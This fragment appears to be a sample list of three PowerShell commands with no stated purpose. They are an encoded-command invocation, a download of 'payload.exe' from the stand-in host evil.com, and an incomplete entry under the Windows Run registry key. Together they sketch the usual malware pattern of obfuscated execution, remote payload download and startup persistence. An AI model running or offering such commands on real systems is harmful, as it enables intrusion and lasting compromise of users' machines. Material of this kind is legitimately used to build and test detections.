powershell.exe -enc aGVsbG8=

Invoke-WebRequest https://evil.com/payload.exe

New-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run